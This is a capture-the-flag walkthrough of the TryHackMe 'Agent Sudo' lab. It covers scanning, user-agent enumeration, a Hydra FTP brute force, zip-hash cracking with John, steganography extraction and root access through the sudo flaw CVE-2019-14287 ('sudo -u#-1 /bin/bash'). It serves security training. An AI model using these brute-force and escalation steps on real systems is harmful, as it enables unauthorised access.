# [Agent Sudo THM Room](https://tryhackme.com/room/agentsudoctf)
## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial target-ip
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-12 16:57 GMT
Nmap scan report for ip-10-10-152-106.eu-west-1.compute.internal (target-ip)
Host is up (0.029s latency).
Not shown: 926 closed ports, 71 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
MAC Address: 02:5F:3C:55:E5:EB (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

### Gobuster
```
gobuster dir -u target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/12/12 16:59:14 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2023/12/12 17:02:40 Finished
===============================================================
```

---
## Enumeration
- After some basic scanning, we can begin our enumeration by visiting the webpage hosted by our target machine. We get navigate to that IP in our web browser, we are greeted with the following:

![Use Codename](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/66aa7db6-94c2-4641-a58f-2b73590fade5)


- We can do some of the basic stuff like viewing the page source to look for HTML comments and what not since our [Gobuster](https://github.com/OJ/gobuster) scan didn't reveal anything worthwhile. However, the content of the message seems to indicate that we need to manipulate the user-agent. After a little bit of research, we can determine that `curl` has this functionality. Specifically, we can use the `-A` flag to specify a user-agent.  [Burp Suite](https://portswigger.net/burp) is another tool that we could leverage, but `curl` is a little quicker. Now, from what we can see, the only codename we know is the one belonging to the person that posted this message: Agent R. Therefore, we should try to use `"R"` as the value we specify with the `-A` flag. Let's put this all together and run the following command:
```
curl -A "R" target-ip
```

- This is the output we get:
```html
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

- The message at the top of this response gives us a hint as to the possible other agent codenames. Agent R references 25 employees, and when we add their name to the list, we get 26. There are 26 letters in the alphabet, so it may be possible to use other single letters in the same way that we used `"R"` in the `curl` command we just ran. Let's start with `"A"` and see what happens. 
```
curl -A "A" target-ip
```

- Here is the output:
```
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

- It seems like this just gives us the content of the page again. Maybe another letter will work. We could do this manually, or we could script this out to automate the process. Here is what I used:
```sh
#!/bin/bash

# Replace 'target-ip' with the actual IP address or URL
TARGET_IP="target-ip"

# Iterate through every letter of the alphabet
for letter in {A..Z}; do
    echo "Sending request with User-Agent: $letter"
    curl -A "$letter" -L $TARGET_IP
done
```

- It is important to note that I added the `-L` flag to follow any redirects. Here is a snippet of the relevant output that reveals a little more information that we can use to our advantage:
```html
Sending request with User-Agent: C
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

- This gives us a few things. First, we may have a potential username of `chris`, since that was referenced in the message. Additionally, we know Agent C has a weak password that we may be able to brute-force. Finally, there is a reference to Agent J, which could also be a potential lead. However, it is important to note that Agent J did not receive a message like the one from Agent C and Agent R when we used the `curl` command. 
- Let's pivot and try to do some brute-forcing. There are a few services we can target with something like [Hydra](https://github.com/vanhauser-thc/thc-hydra), the username `chris`, and a password list. Let's start with FTP. The syntax to do this will look something like this:
```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://target-ip
```

- Here is the output:
```python
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-12-12 19:35:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://target-ip:21/
[21][ftp] host: target-ip   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-12-12 19:37:00
```

- From this output, we can see that the `chris` user can authenticate to the FTP service with `crystal` as the password. Let's try and log in and see what Chris can see.
- Once we are successfully authenticated, this is what we can see:
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

- Let's use the `get` command to pull down all these files. Once we do that, we can see what makes them tick. 
- Let's see what the `To_agentJ.txt` file says:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

- It looks like Chris references the password for Agent J and how it is stored in the fake picture. This could be through steganography or some other silly encoding mechanism. Let's try the most obvious, though, and see what the pictures are. 

- `cute-alien.jpg`:
![cute-alien File](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/7573e325-efca-41f1-992f-62f6f861d5f3)


- `cutie.png`
![cutie File](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/0f643699-4116-4dff-af75-ba910920b636)


- There doesn't seem to be any obvious passwords that we can see by just looking at these pictures, so we are going to have to use some other techniques. Typically, I always start assessing pictures with [Strings](https://www.howtoforge.com/linux-strings-command/) and [Binwalk](https://github.com/ReFirmLabs/binwalk). [Strings](https://www.howtoforge.com/linux-strings-command/) will give us any plaintext characters inside a file, while [Binwalk](https://github.com/ReFirmLabs/binwalk) can extract embedded files. You can also use an online tool like [CyberChef](https://cyberchef.org/) to do this. 
- When I use [Strings](https://www.howtoforge.com/linux-strings-command/) on the `cute-alien.jpg` file, I didn't see much. However, I did get the following plaintext snippet when I used [Strings](https://www.howtoforge.com/linux-strings-command/) on the `cutie.png` file:
```
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```

- From this, we can deduce that there is likely a file embedded into this picture. We can use [Binwalk](https://github.com/ReFirmLabs/binwalk) to pull it out with the following syntax:
```
binwalk -e cutie.png
```

- Here is what we get when we enter this command:
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive
```

- It looks like we got something. Let's take a look at what we've discovered. 
- When I try to `cat To_agentR.txt`, I don't get any output. However, when I try to unzip the zipped archive with `7z x 8702.zip`, I am prompted for a password. 
- From here, we have to find a way to get the password for the zipped file. We can leverage [John The Ripper](https://www.openwall.com/john/) and its `zip2john` module that will potentially allow us to pull a password hash we can attempt to crack. To do this, we use `zip2john 8702.zip`. Here is the output of that command:
```
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

- We could edit our command to throw that output directly into a `hash.txt` file that [John The Ripper](https://www.openwall.com/john/) could work with. It would look something like this:
```
zip2john 8702.zip > hash.txt
```

- Let's crack that hash with the following syntax:
```
john hash.txt -w /usr/share/wordlists/rockyou.txt
```

- When we do this without specifying a hash format, a bunch of warnings will be generated. However, it'll produce a match eventually. Here's what we have found:
```python
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2023-12-12 20:03) 1.923g/s 6819p/s 6819c/s 6819C/s 123456..sss
```

- It looks like `alien` is the password for the zipped archive. Let's try to unzip the folder again and supply it with the password. If everything goes correctly, it should reveal the contents. 
- Now that the archive is extracted, we can see that the `To_agentR.txt` file actually has content. Here is what is inside:
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

- Now, we have what seems to be some encoded message of some sort. It doesn't look like it's the format of a hash, and I don't think it's plaintext. We can play around with this string on [CyberChef](https://cyberchef.org/) and see if that could give us some more information. 
- When we throw this string into the input field on [CyberChef](https://cyberchef.org/), it is immediately recognized as base64 encoding. We can press the little magic wand next to the output field and [CyberChef](https://cyberchef.org/) will apply the appropriate recipe to decode the text. When we do this, we get `Area51` as the output, which seems to be the answer to one of the THM questions. 


---
## System Hacking
- Okay, now we have extracted a password from the `cutie.png` file. We only did a bit of enumeration on the `cute-alien.jpg` file, so let's go back there and see what we can find. Right now, we only have a suspected password of `Area51`. Hopefully, the other image will give us more information. 
- Once again, we can use [Binwalk](https://github.com/ReFirmLabs/binwalk) to try and extract any hidden data. Unfortunately, this doesn't seem to yield any results. Let's throw this into [CyberChef](https://cyberchef.org/) and see if that can give us anything to go on. 
- That didn't seem to give us anything worthwhile either. Let's try to use another steganography extraction tool that might hit something [Binwalk](https://github.com/ReFirmLabs/binwalk) didn't. We can leverage [Steghide](https://steghide.sourceforge.net/) for this. Here is the syntax we will need:
```
steghide extract -sf cute-alien.jpg
```

- Let's break this command down a bit. First, we are using the `extract` function of [Steghide](https://steghide.sourceforge.net/), and then specifying the `-sf` flag to indicate the steg file we want to deal with. When we run this and enter the `Area51` password, we get a `message.txt`. Here is what it says:
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

- It looks like Agent J's real name is James and his login password is `hackerrules!`. Let's try and see what James can access. Since SSH is open, lets try to get access with these credentials. 
- In his home directory, we can grab the flag from the `user_flag.txt` file.

---
## Privilege Escalation
- Now that we are on the box, let's look around and see what we can do to get root permissions. Typically, I start out by using `sudo -l` to see what kind of permissions our user has, and if they can run anything as root. When we do that for the `james` user, we get the following information:
```
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

- Now, THM is asking for the CVE number for this insecure binary. We can google `(ALL, !root) /bin/bash`, which will lead us to the exploit found on [Exploit-DB](https://www.exploit-db.com/). The correct CVE number is **CVE 2019-14287**. We can simply copy the script and run it on our machine. From the script found on [Exploit-DB](https://www.exploit-db.com/), the only syntax we really need is the following:
```python
sudo -u#-1 + binary

OR 

sudo -u#-1 /bin/bash
```

- Once we throw that in and press enter, we can see that we are now root. All we have to do is `cat /root/root.txt` and we get the following:
```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
{flag}

By,
DesKel a.k.a Agent R
```


---
### Extra
- There is a part of this challenge that isn't directly related to get access and escalating privileges, and that is regarding the `Alien_autopsy.jpg` file in the `/home/james` directory on the target. We can use SCP to get it over with the following:
```
scp james@target-ip:Alien_autopsy.jpg ~/
```

- Once we have this file, we can do some googling and reverse image searching to find an article from Fox News that dubs the incident the Roswell alien autopsy, which is the answer to the question.
